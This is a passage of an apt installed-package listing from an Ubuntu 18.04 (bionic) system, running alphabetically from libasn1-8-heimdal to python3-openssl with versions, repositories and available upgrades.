libasn1-8-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libassuan0/bionic,now 2.5.1-2 amd64 [installed]
libatm1/bionic,now 1:2.5.1-2build1 amd64 [installed]
libatomic1/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libattr1/bionic,now 1:2.4.47-2build1 amd64 [installed]
libaudit-common/bionic,now 1:2.8.2-1ubuntu1 all [installed]
libaudit1/bionic,now 1:2.8.2-1ubuntu1 amd64 [installed]
libbind9-160/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libbinutils/bionic-updates,bionic-security,now 2.30-21ubuntu1~18.04.2 amd64 [installed,automatic]
libblkid1/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
libbsd0/bionic,now 0.8.7-1 amd64 [installed]
libbz2-1.0/bionic-updates,bionic-security,now 1.0.6-8.1ubuntu0.2 amd64 [installed]
libc-bin/bionic,now 2.27-3ubuntu1 amd64 [installed]
libc-dev-bin/bionic,now 2.27-3ubuntu1 amd64 [installed,automatic]
libc6/bionic,now 2.27-3ubuntu1 amd64 [installed]
libc6-dev/bionic,now 2.27-3ubuntu1 amd64 [installed,automatic]
libcap-ng0/bionic,now 0.7.7-3.1 amd64 [installed]
libcap2/bionic,now 1:2.25-1.2 amd64 [installed]
libcap2-bin/bionic,now 1:2.25-1.2 amd64 [installed]
libcc1-0/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libcilkrts5/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
libcom-err2/bionic-updates,bionic-security,now 1.44.1-1ubuntu1.2 amd64 [installed]
libcryptsetup12/bionic-updates,now 2:2.0.2-1ubuntu1.1 amd64 [installed]
libcurl3-gnutls/bionic-updates,bionic-security,now 7.58.0-2ubuntu3.8 amd64 [installed]
libcurl4/bionic-updates,bionic-security,now 7.58.0-2ubuntu3.8 amd64 [installed]
libdb5.3/bionic-updates,bionic-security,now 5.3.28-13.1ubuntu1.1 amd64 [installed]
libdbus-1-3/bionic-updates,bionic-security,now 1.12.2-1ubuntu1.1 amd64 [installed]
libdbus-glib-1-2/bionic,now 0.110-2 amd64 [installed,automatic]
libdebconfclient0/bionic,now 0.213ubuntu1 amd64 [installed]
libdevmapper-event1.02.1/bionic,now 2:1.02.145-4.1ubuntu3 amd64 [installed,upgradable to: 2:1.02.145-4.1ubuntu3.18.04.1]
libdevmapper1.02.1/bionic,now 2:1.02.145-4.1ubuntu3 amd64 [installed,upgradable to: 2:1.02.145-4.1ubuntu3.18.04.1]
libdns-export1100/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libdns1100/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libdrm-common/now 2.4.95-1~18.04.1 all [installed,upgradable to: 2.4.97-1ubuntu1~18.04.1]
libdrm2/now 2.4.95-1~18.04.1 amd64 [installed,upgradable to: 2.4.97-1ubuntu1~18.04.1]
libdumbnet1/bionic,now 1.12-7build1 amd64 [installed]
libeatmydata1/bionic,now 105-6 amd64 [installed,automatic]
libedit2/bionic,now 3.1-20170329-1 amd64 [installed]
libelf1/bionic-updates,bionic-security,now 0.170-0.4ubuntu0.1 amd64 [installed]
liberror-perl/bionic,now 0.17025-1 all [installed]
libestr0/bionic,now 0.1.10-2.1 amd64 [installed]
libevent-2.1-6/bionic,now 2.1.8-stable-4build1 amd64 [installed]
libexpat1/bionic-updates,bionic-security,now 2.2.5-3ubuntu0.2 amd64 [installed]
libext2fs2/bionic-updates,bionic-security,now 1.44.1-1ubuntu1.2 amd64 [installed]
libfastjson4/bionic,now 0.99.8-2 amd64 [installed]
libfdisk1/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
libffi6/bionic,now 3.2.1-8 amd64 [installed]
libfreetype6/bionic,now 2.8.1-2ubuntu2 amd64 [installed,automatic]
libfribidi0/bionic,now 0.19.7-2 amd64 [installed]
libfuse2/bionic,now 2.9.7-1ubuntu1 amd64 [installed]
libgcc-7-dev/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
libgcc1/bionic-updates,bionic-security,now 1:8.3.0-6ubuntu1~18.04.1 amd64 [installed]
libgcrypt20/bionic-updates,bionic-security,now 1.8.1-4ubuntu1.1 amd64 [installed]
libgdbm-compat4/bionic,now 1.14.1-6 amd64 [installed]
libgdbm5/bionic,now 1.14.1-6 amd64 [installed]
libgeoip1/bionic,now 1.6.12-1 amd64 [installed]
libgirepository-1.0-1/bionic,now 1.56.1-1 amd64 [installed]
libglib2.0-0/bionic-updates,bionic-security,now 2.56.4-0ubuntu0.18.04.4 amd64 [installed]
libglib2.0-data/bionic-updates,bionic-security,now 2.56.4-0ubuntu0.18.04.4 all [installed]
libgmp10/bionic,now 2:6.1.2+dfsg-2 amd64 [installed]
libgnutls30/bionic-updates,bionic-security,now 3.5.18-1ubuntu1.1 amd64 [installed]
libgomp1/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libgpg-error0/bionic,now 1.27-6 amd64 [installed]
libgpm2/bionic,now 1.20.7-5 amd64 [installed]
libgssapi-krb5-2/bionic-updates,bionic-security,now 1.16-2ubuntu0.1 amd64 [installed]
libgssapi3-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libhcrypto4-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libheimbase1-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libheimntlm0-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libhogweed4/bionic,now 3.4-1 amd64 [installed]
libhx509-5-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libicu60/bionic,now 60.2-3ubuntu3 amd64 [installed]
libidn11/bionic,now 1.33-2.1ubuntu1 amd64 [installed,upgradable to: 1.33-2.1ubuntu1.2]
libidn2-0/bionic,now 2.0.4-1.1build2 amd64 [installed]
libip4tc0/bionic,now 1.6.1-2ubuntu2 amd64 [installed]
libip6tc0/bionic,now 1.6.1-2ubuntu2 amd64 [installed]
libiptc0/bionic,now 1.6.1-2ubuntu2 amd64 [installed]
libirs160/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libisc-export169/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libisc169/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libisccc160/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libisccfg160/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
libisl19/bionic,now 0.19-1 amd64 [installed,automatic]
libisns0/bionic,now 0.97-2build1 amd64 [installed]
libitm1/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libjpeg-turbo8/bionic-updates,bionic-security,now 1.5.2-0ubuntu5.18.04.1 amd64 [installed,automatic]
libjpeg8/bionic,now 8c-2ubuntu8 amd64 [installed,automatic]
libjson-c3/bionic,now 0.12.1-1.3 amd64 [installed]
libk5crypto3/bionic-updates,bionic-security,now 1.16-2ubuntu0.1 amd64 [installed]
libkeyutils1/bionic,now 1.5.9-9.2ubuntu2 amd64 [installed]
libklibc/bionic,now 2.0.4-9ubuntu2 amd64 [installed]
libkmod2/bionic-updates,now 24-1ubuntu3.2 amd64 [installed]
libkrb5-26-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libkrb5-3/bionic-updates,bionic-security,now 1.16-2ubuntu0.1 amd64 [installed]
libkrb5support0/bionic-updates,bionic-security,now 1.16-2ubuntu0.1 amd64 [installed]
libksba8/bionic,now 1.3.5-2 amd64 [installed]
libldap-2.4-2/bionic-security,now 2.4.45+dfsg-1ubuntu1.3 amd64 [installed,upgradable to: 2.4.45+dfsg-1ubuntu1.4]
libldap-common/bionic-security,now 2.4.45+dfsg-1ubuntu1.3 all [installed,upgradable to: 2.4.45+dfsg-1ubuntu1.4]
liblocale-gettext-perl/bionic,now 1.07-3build2 amd64 [installed]
liblsan0/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
liblua5.2-0/bionic,now 5.2.4-1.1build1 amd64 [installed,automatic]
liblvm2app2.2/bionic,now 2.02.176-4.1ubuntu3 amd64 [installed,upgradable to: 2.02.176-4.1ubuntu3.18.04.1]
liblvm2cmd2.02/bionic,now 2.02.176-4.1ubuntu3 amd64 [installed,upgradable to: 2.02.176-4.1ubuntu3.18.04.1]
liblwres160/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
liblxc-common/bionic-updates,now 3.0.3-0ubuntu1~18.04.1 amd64 [installed]
liblxc1/bionic-updates,now 3.0.3-0ubuntu1~18.04.1 amd64 [installed]
liblz4-1/bionic,now 0.0~r131-2ubuntu3 amd64 [installed]
liblzma5/bionic,now 5.2.2-1.3 amd64 [installed]
liblzo2-2/bionic,now 2.08-1.2 amd64 [installed]
libmagic-mgc/bionic-updates,bionic-security,now 1:5.32-2ubuntu0.2 amd64 [installed]
libmagic1/bionic-updates,bionic-security,now 1:5.32-2ubuntu0.2 amd64 [installed]
libmcrypt4/bionic,now 2.5.8-3.3 amd64 [installed,automatic]
libmhash2/bionic,now 0.9.9.9-7 amd64 [installed,automatic]
libmnl0/bionic,now 1.0.4-2 amd64 [installed]
libmount1/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
libmpc3/bionic,now 1.1.0-1 amd64 [installed,automatic]
libmpdec2/bionic,now 2.4.2-1ubuntu1 amd64 [installed]
libmpfr6/bionic,now 4.0.1-1 amd64 [installed]
libmpx2/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libmspack0/bionic-updates,bionic-security,now 0.6-3ubuntu0.3 amd64 [installed]
libncurses5/bionic-updates,now 6.1-1ubuntu1.18.04 amd64 [installed]
libncursesw5/bionic-updates,now 6.1-1ubuntu1.18.04 amd64 [installed]
libnetfilter-conntrack3/bionic,now 1.0.6-2 amd64 [installed]
libnettle6/bionic,now 3.4-1 amd64 [installed]
libnewt0.52/bionic,now 0.52.20-1ubuntu1 amd64 [installed]
libnfnetlink0/bionic,now 1.0.1-3 amd64 [installed]
libnfsidmap2/bionic,now 0.25-5.1 amd64 [installed,automatic]
libnghttp2-14/bionic,now 1.30.0-1ubuntu1 amd64 [installed]
libnih1/bionic,now 1.0.3-6ubuntu2 amd64 [installed]
libnl-3-200/bionic,now 3.2.29-0ubuntu3 amd64 [installed,automatic]
libnl-genl-3-200/bionic,now 3.2.29-0ubuntu3 amd64 [installed,automatic]
libnpth0/bionic,now 1.5-3 amd64 [installed]
libnss-systemd/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
libntfs-3g88/bionic-updates,bionic-security,now 1:2017.3.23-2ubuntu0.18.04.2 amd64 [installed]
libnuma1/bionic,now 2.0.11-2.1 amd64 [installed,upgradable to: 2.0.11-2.1ubuntu0.1]
libp11-kit0/bionic,now 0.23.9-2 amd64 [installed]
libpam-cap/bionic,now 1:2.25-1.2 amd64 [installed]
libpam-modules/bionic,now 1.1.8-3.6ubuntu2 amd64 [installed,upgradable to: 1.1.8-3.6ubuntu2.18.04.1]
libpam-modules-bin/bionic,now 1.1.8-3.6ubuntu2 amd64 [installed,upgradable to: 1.1.8-3.6ubuntu2.18.04.1]
libpam-runtime/bionic,now 1.1.8-3.6ubuntu2 all [installed,upgradable to: 1.1.8-3.6ubuntu2.18.04.1]
libpam-systemd/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
libpam0g/bionic,now 1.1.8-3.6ubuntu2 amd64 [installed,upgradable to: 1.1.8-3.6ubuntu2.18.04.1]
libparted2/now 3.2-20ubuntu0.1 amd64 [installed,upgradable to: 3.2-20ubuntu0.2]
libpcap0.8/bionic,now 1.8.1-6ubuntu1 amd64 [installed]
libpci3/bionic,now 1:3.5.2-1ubuntu1 amd64 [installed,upgradable to: 1:3.5.2-1ubuntu1.1]
libpcre3/bionic,now 2:8.39-9 amd64 [installed]
libperl5.26/bionic-updates,bionic-security,now 5.26.1-6ubuntu0.3 amd64 [installed]
libpipeline1/bionic,now 1.5.0-1 amd64 [installed]
libplymouth4/now 0.9.3-1ubuntu7.18.04.1 amd64 [installed,upgradable to: 0.9.3-1ubuntu7.18.04.2]
libpng16-16/bionic-updates,bionic-security,now 1.6.34-1ubuntu0.18.04.2 amd64 [installed]
libpolkit-agent-1-0/bionic-updates,bionic-security,now 0.105-20ubuntu0.18.04.5 amd64 [installed]
libpolkit-backend-1-0/bionic-updates,bionic-security,now 0.105-20ubuntu0.18.04.5 amd64 [installed]
libpolkit-gobject-1-0/bionic-updates,bionic-security,now 0.105-20ubuntu0.18.04.5 amd64 [installed]
libpopt0/bionic,now 1.16-11 amd64 [installed]
libprocps6/bionic-security,now 2:3.3.12-3ubuntu1.1 amd64 [installed,upgradable to: 2:3.3.12-3ubuntu1.2]
libpsl5/bionic,now 0.19.1-5build1 amd64 [installed]
libpython-stdlib/bionic,now 2.7.15~rc1-1 amd64 [installed,automatic]
libpython2.7-minimal/bionic-updates,bionic-security,now 2.7.15-4ubuntu4~18.04.1 amd64 [installed,automatic]
libpython2.7-stdlib/bionic-updates,bionic-security,now 2.7.15-4ubuntu4~18.04.1 amd64 [installed,automatic]
libpython3-stdlib/bionic-updates,now 3.6.7-1~18.04 amd64 [installed]
libpython3.6/bionic-updates,bionic-security,now 3.6.8-1~18.04.2 amd64 [installed]
libpython3.6-minimal/bionic-updates,bionic-security,now 3.6.8-1~18.04.2 amd64 [installed]
libpython3.6-stdlib/bionic-updates,bionic-security,now 3.6.8-1~18.04.2 amd64 [installed]
libquadmath0/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libreadline5/bionic,now 5.2+dfsg-3build1 amd64 [installed]
libreadline7/bionic,now 7.0-3 amd64 [installed]
libroken18-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
librtmp1/bionic,now 2.4+20151223.gitfa8646d.1-1 amd64 [installed]
libsasl2-2/bionic,now 2.1.27~101-g0780600+dfsg-3ubuntu2 amd64 [installed]
libsasl2-modules/bionic,now 2.1.27~101-g0780600+dfsg-3ubuntu2 amd64 [installed]
libsasl2-modules-db/bionic,now 2.1.27~101-g0780600+dfsg-3ubuntu2 amd64 [installed]
libseccomp2/bionic-updates,bionic-security,now 2.4.1-0ubuntu0.18.04.2 amd64 [installed]
libselinux1/bionic,now 2.7-2build2 amd64 [installed]
libsemanage-common/bionic,now 2.7-2build2 all [installed]
libsemanage1/bionic,now 2.7-2build2 amd64 [installed]
libsepol1/bionic,now 2.7-1 amd64 [installed]
libsigsegv2/bionic,now 2.12-1 amd64 [installed]
libslang2/bionic,now 2.3.1a-3ubuntu1 amd64 [installed]
libsmartcols1/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
libsodium23/bionic,now 1.0.16-2 amd64 [installed,automatic]
libsqlite3-0/bionic-updates,bionic-security,now 3.22.0-1ubuntu0.1 amd64 [installed]
libss2/bionic-updates,bionic-security,now 1.44.1-1ubuntu1.2 amd64 [installed]
libssl1.0.0/bionic-updates,bionic-security,now 1.0.2n-1ubuntu5.3 amd64 [installed]
libssl1.1/bionic-updates,bionic-security,now 1.1.1-1ubuntu2.1~18.04.4 amd64 [installed]
libstdc++6/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed]
libsystemd0/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
libtasn1-6/bionic,now 4.13-2 amd64 [installed]
libtext-charwidth-perl/bionic,now 0.04-7.1 amd64 [installed]
libtext-iconv-perl/bionic,now 1.7-5build6 amd64 [installed]
libtext-wrapi18n-perl/bionic,now 0.06-7.1 all [installed]
libtinfo5/bionic-updates,now 6.1-1ubuntu1.18.04 amd64 [installed]
libtirpc1/bionic-updates,bionic-security,now 0.2.5-1.2ubuntu0.1 amd64 [installed,automatic]
libtsan0/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed,automatic]
libubsan0/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
libudev1/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
libunistring2/bionic,now 0.9.9-0ubuntu1 amd64 [installed,upgradable to: 0.9.9-0ubuntu2]
libunwind8/bionic,now 1.2.1-8 amd64 [installed]
libusb-1.0-0/bionic,now 2:1.0.21-2 amd64 [installed]
libutempter0/bionic,now 1.1.6-3 amd64 [installed]
libuuid1/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
libuv1/bionic,now 1.18.0-3 amd64 [installed,automatic]
libwind0-heimdal/bionic,now 7.5.0+dfsg-1 amd64 [installed]
libwrap0/bionic,now 7.6.q-27 amd64 [installed,automatic]
libx11-6/bionic-security,now 2:1.6.4-3ubuntu0.1 amd64 [installed,upgradable to: 2:1.6.4-3ubuntu0.2]
libx11-data/bionic-security,now 2:1.6.4-3ubuntu0.1 all [installed,upgradable to: 2:1.6.4-3ubuntu0.2]
libxau6/bionic,now 1:1.0.8-1 amd64 [installed]
libxcb1/bionic,now 1.13-1 amd64 [installed,upgradable to: 1.13-2~ubuntu18.04]
libxdmcp6/bionic,now 1:1.1.2-3 amd64 [installed]
libxext6/bionic,now 2:1.3.3-1 amd64 [installed]
libxml2/bionic-updates,bionic-security,now 2.9.4+dfsg1-6.1ubuntu1.2 amd64 [installed]
libxmlsec1/bionic,now 1.2.25-1build1 amd64 [installed]
libxmlsec1-openssl/bionic,now 1.2.25-1build1 amd64 [installed]
libxmuu1/bionic,now 2:1.1.2-2 amd64 [installed]
libxslt1.1/bionic-updates,bionic-security,now 1.1.29-5ubuntu0.1 amd64 [installed]
libxtables12/bionic,now 1.6.1-2ubuntu2 amd64 [installed]
libyaml-0-2/bionic,now 0.1.7-2ubuntu3 amd64 [installed]
libzstd1/bionic-updates,bionic-security,now 1.3.3+dfsg-2ubuntu1.1 amd64 [installed]
linux-base/bionic,now 4.5ubuntu1 all [installed]
linux-firmware/bionic-updates,bionic-security,now 1.173.9 all [installed,automatic]
linux-generic/bionic-updates,bionic-security,now 4.15.0.65.67 amd64 [installed]
linux-headers-4.15.0-64/bionic-updates,bionic-security,now 4.15.0-64.73 all [installed,automatic]
linux-headers-4.15.0-64-generic/bionic-updates,bionic-security,now 4.15.0-64.73 amd64 [installed,automatic]
linux-headers-4.15.0-65/bionic-updates,bionic-security,now 4.15.0-65.74 all [installed,automatic]
linux-headers-4.15.0-65-generic/bionic-updates,bionic-security,now 4.15.0-65.74 amd64 [installed,automatic]
linux-headers-generic/bionic-updates,bionic-security,now 4.15.0.65.67 amd64 [installed,automatic]
linux-image-4.15.0-64-generic/bionic-updates,bionic-security,now 4.15.0-64.73 amd64 [installed,automatic]
linux-image-4.15.0-65-generic/bionic-updates,bionic-security,now 4.15.0-65.74 amd64 [installed,automatic]
linux-image-generic/bionic-updates,bionic-security,now 4.15.0.65.67 amd64 [installed,automatic]
linux-libc-dev/bionic-updates,bionic-security,now 4.15.0-65.74 amd64 [installed,automatic]
linux-modules-4.15.0-64-generic/bionic-updates,bionic-security,now 4.15.0-64.73 amd64 [installed,automatic]
linux-modules-4.15.0-65-generic/bionic-updates,bionic-security,now 4.15.0-65.74 amd64 [installed,automatic]
linux-modules-extra-4.15.0-64-generic/bionic-updates,bionic-security,now 4.15.0-64.73 amd64 [installed,automatic]
linux-modules-extra-4.15.0-65-generic/bionic-updates,bionic-security,now 4.15.0-65.74 amd64 [installed,automatic]
locales/bionic,now 2.27-3ubuntu1 all [installed]
login/bionic,now 1:4.5-1ubuntu1 amd64 [installed,upgradable to: 1:4.5-1ubuntu2]
logrotate/bionic,now 3.11.0-0.1ubuntu1 amd64 [installed]
lsb-base/bionic,now 9.20170808ubuntu1 all [installed]
lsb-release/bionic,now 9.20170808ubuntu1 all [installed]
lshw/bionic-updates,now 02.18-0.1ubuntu6.18.04.1 amd64 [installed]
lsof/bionic,now 4.89+dfsg-0.1 amd64 [installed]
ltrace/bionic,now 0.7.3-6ubuntu1 amd64 [installed]
lvm2/bionic,now 2.02.176-4.1ubuntu3 amd64 [installed,upgradable to: 2.02.176-4.1ubuntu3.18.04.1]
lxcfs/bionic-updates,now 3.0.3-0ubuntu1~18.04.1 amd64 [installed]
lxd/bionic-updates,now 3.0.3-0ubuntu1~18.04.1 amd64 [installed]
lxd-client/bionic-updates,now 3.0.3-0ubuntu1~18.04.1 amd64 [installed]
make/bionic,now 4.1-9.1ubuntu1 amd64 [installed]
man-db/bionic-updates,now 2.8.3-2ubuntu0.1 amd64 [installed]
manpages/bionic,now 4.15-1 all [installed]
manpages-dev/bionic,now 4.15-1 all [installed,automatic]
mawk/bionic,now 1.3.3-17ubuntu3 amd64 [installed]
mdadm/now 4.1~rc1-3~ubuntu18.04.1 amd64 [installed,upgradable to: 4.1~rc1-3~ubuntu18.04.2]
mime-support/bionic,now 3.60ubuntu1 all [installed]
mlocate/bionic,now 0.26-2ubuntu3.1 amd64 [installed]
mount/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
mtr-tiny/bionic,now 0.92-1 amd64 [installed]
multiarch-support/bionic,now 2.27-3ubuntu1 amd64 [installed]
nano/bionic,now 2.9.3-2 amd64 [installed]
ncurses-base/bionic-updates,now 6.1-1ubuntu1.18.04 all [installed]
ncurses-bin/bionic-updates,now 6.1-1ubuntu1.18.04 amd64 [installed]
ncurses-term/bionic-updates,now 6.1-1ubuntu1.18.04 all [installed,automatic]
net-tools/bionic,now 1.60+git20161116.90da8a0-1ubuntu1 amd64 [installed]
netbase/bionic,now 5.4 all [installed]
netcat-openbsd/bionic-updates,now 1.187-1ubuntu0.1 amd64 [installed]
netfilter-persistent/bionic-updates,now 1.0.4+nmu2ubuntu1 all [installed,automatic]
netplan.io/bionic-security,now 0.40.1~18.04.4 amd64 [installed,upgradable to: 0.98-0ubuntu1~18.04.1]
networkd-dispatcher/bionic-updates,now 1.7-0ubuntu3.3 all [installed]
nfs-common/bionic-updates,now 1:1.3.4-2.1ubuntu5.2 amd64 [installed,automatic]
nfs-kernel-server/bionic-updates,now 1:1.3.4-2.1ubuntu5.2 amd64 [installed]
nplan/bionic-security,now 0.40.1~18.04.4 all [installed,upgradable to: 0.98-0ubuntu1~18.04.1]
ntfs-3g/bionic-updates,bionic-security,now 1:2017.3.23-2ubuntu0.18.04.2 amd64 [installed]
open-iscsi/now 2.0.874-5ubuntu2.6 amd64 [installed,upgradable to: 2.0.874-5ubuntu2.7]
open-vm-tools/now 2:10.3.0-0ubuntu1~18.04.3 amd64 [installed,upgradable to: 2:10.3.10-1~ubuntu0.18.04.1]
openssh-client/bionic-updates,bionic-security,now 1:7.6p1-4ubuntu0.3 amd64 [installed]
openssh-server/bionic-updates,bionic-security,now 1:7.6p1-4ubuntu0.3 amd64 [installed]
openssh-sftp-server/bionic-updates,bionic-security,now 1:7.6p1-4ubuntu0.3 amd64 [installed,automatic]
openssl/bionic-updates,bionic-security,now 1.1.1-1ubuntu2.1~18.04.4 amd64 [installed]
os-prober/bionic,now 1.74ubuntu1 amd64 [installed,automatic]
overlayroot/bionic-updates,now 0.40ubuntu1.1 all [installed]
parted/now 3.2-20ubuntu0.1 amd64 [installed,upgradable to: 3.2-20ubuntu0.2]
passwd/bionic,now 1:4.5-1ubuntu1 amd64 [installed,upgradable to: 1:4.5-1ubuntu2]
pastebinit/bionic,now 1.5-2 all [installed]
patch/bionic-updates,bionic-security,now 2.7.6-2ubuntu1.1 amd64 [installed]
pciutils/bionic,now 1:3.5.2-1ubuntu1 amd64 [installed,upgradable to: 1:3.5.2-1ubuntu1.1]
perl/bionic-updates,bionic-security,now 5.26.1-6ubuntu0.3 amd64 [installed]
perl-base/bionic-updates,bionic-security,now 5.26.1-6ubuntu0.3 amd64 [installed]
perl-modules-5.26/bionic-updates,bionic-security,now 5.26.1-6ubuntu0.3 all [installed]
php/bionic,now 1:7.2+60ubuntu1 all [installed]
php-common/bionic,now 1:60ubuntu1 all [installed,automatic]
php7.2/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 all [installed,automatic]
php7.2-cli/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 amd64 [installed,automatic]
php7.2-common/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 amd64 [installed,automatic]
php7.2-json/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 amd64 [installed,automatic]
php7.2-opcache/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 amd64 [installed,automatic]
php7.2-readline/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 amd64 [installed,automatic]
pinentry-curses/bionic,now 1.1.0-1 amd64 [installed]
plymouth/now 0.9.3-1ubuntu7.18.04.1 amd64 [installed,upgradable to: 0.9.3-1ubuntu7.18.04.2]
plymouth-theme-ubuntu-text/now 0.9.3-1ubuntu7.18.04.1 amd64 [installed,upgradable to: 0.9.3-1ubuntu7.18.04.2]
policykit-1/bionic-updates,bionic-security,now 0.105-20ubuntu0.18.04.5 amd64 [installed]
pollinate/bionic-updates,now 4.33-0ubuntu1~18.04.1 all [installed]
popularity-contest/bionic,now 1.66ubuntu1 all [installed]
powermgmt-base/bionic,now 1.33 all [installed]
procps/bionic-security,now 2:3.3.12-3ubuntu1.1 amd64 [installed,upgradable to: 2:3.3.12-3ubuntu1.2]
psmisc/bionic-updates,now 23.1-1ubuntu0.1 amd64 [installed]
publicsuffix/bionic,now 20180223.1310-1 all [installed]
python/bionic,now 2.7.15~rc1-1 amd64 [installed,automatic]
python-apt-common/now 1.6.3ubuntu1 all [installed,upgradable to: 1.6.4]
python-minimal/bionic,now 2.7.15~rc1-1 amd64 [installed,automatic]
python2.7/bionic-updates,bionic-security,now 2.7.15-4ubuntu4~18.04.1 amd64 [installed,automatic]
python2.7-minimal/bionic-updates,bionic-security,now 2.7.15-4ubuntu4~18.04.1 amd64 [installed,automatic]
python3/bionic-updates,now 3.6.7-1~18.04 amd64 [installed]
python3-apport/bionic-updates,bionic-security,now 2.20.9-0ubuntu7.7 all [installed]
python3-apt/now 1.6.3ubuntu1 amd64 [installed,upgradable to: 1.6.4]
python3-asn1crypto/bionic,now 0.24.0-1 all [installed]
python3-attr/bionic,now 17.4.0-2 all [installed]
python3-automat/bionic,now 0.6.0-1 all [installed]
python3-blinker/bionic,now 1.4+dfsg1-0.1 all [installed,automatic]
python3-certifi/bionic,now 2018.1.18-2 all [installed]
python3-cffi-backend/bionic,now 1.11.5-1 amd64 [installed]
python3-chardet/bionic,now 3.0.4-1 all [installed]
python3-click/bionic,now 6.7-3 all [installed]
python3-colorama/bionic,now 0.3.7-1 all [installed]
python3-commandnotfound/bionic-updates,now 18.04.5 all [installed]
python3-configobj/bionic,now 5.0.6-2 all [installed]
python3-constantly/bionic,now 15.1.0-1 all [installed]
python3-cryptography/bionic-updates,bionic-security,now 2.1.4-1ubuntu1.3 amd64 [installed]
python3-dbus/bionic,now 1.2.6-1 amd64 [installed]
python3-debconf/bionic,now 1.5.66 all [installed,upgradable to: 1.5.66ubuntu1]
python3-debian/bionic,now 0.1.32 all [installed]
python3-distro-info/bionic-updates,bionic-security,now 0.18ubuntu0.18.04.1 all [installed]
python3-distupgrade/now 1:18.04.30 all [installed,upgradable to: 1:18.04.34]
python3-gdbm/now 3.6.7-1~18.04 amd64 [installed,upgradable to: 3.6.8-1~18.04]
python3-gi/bionic,now 3.26.1-2 amd64 [installed,upgradable to: 3.26.1-2ubuntu1]
python3-httplib2/bionic,now 0.9.2+dfsg-1 all [installed,upgradable to: 0.9.2+dfsg-1ubuntu0.1]
python3-hyperlink/bionic,now 17.3.1-2 all [installed]
python3-idna/bionic,now 2.6-1 all [installed]
python3-incremental/bionic,now 16.10.1-3 all [installed]
python3-jinja2/bionic-updates,bionic-security,now 2.10-1ubuntu0.18.04.1 all [installed,automatic]
python3-json-pointer/bionic,now 1.10-1 all [installed,automatic]
python3-jsonpatch/bionic,now 1.19+really1.16-1fakesync1 all [installed,automatic]
python3-jsonschema/bionic,now 2.6.0-2 all [installed,automatic]
python3-jwt/bionic,now 1.5.3+ds1-1 all [installed,automatic]
python3-markupsafe/bionic,now 1.0-1build1 amd64 [installed,automatic]
python3-minimal/bionic-updates,now 3.6.7-1~18.04 amd64 [installed]
python3-netifaces/bionic,now 0.10.4-0.1build4 amd64 [installed,automatic]
python3-newt/bionic,now 0.52.20-1ubuntu1 amd64 [installed]
python3-oauthlib/bionic,now 2.0.6-1 all [installed,automatic]
python3-openssl/bionic,now 17.5.0-1ubuntu1 all [installed]
